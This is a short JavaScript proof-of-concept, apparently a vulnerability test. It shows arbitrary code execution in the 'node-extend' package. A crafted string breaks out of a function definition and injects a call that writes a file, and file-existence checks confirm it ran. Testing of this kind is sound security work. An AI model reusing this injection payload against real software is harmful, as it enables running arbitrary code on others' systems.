// test("Arbitrary code execution in node-extend", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const extend = require("node-extend");
  const path = "./node-extend";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  try {
    foo = extend(
      "function (){});require(`fs`).writeFileSync('node-extend',''); //(){console.log(123)}",
       ""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
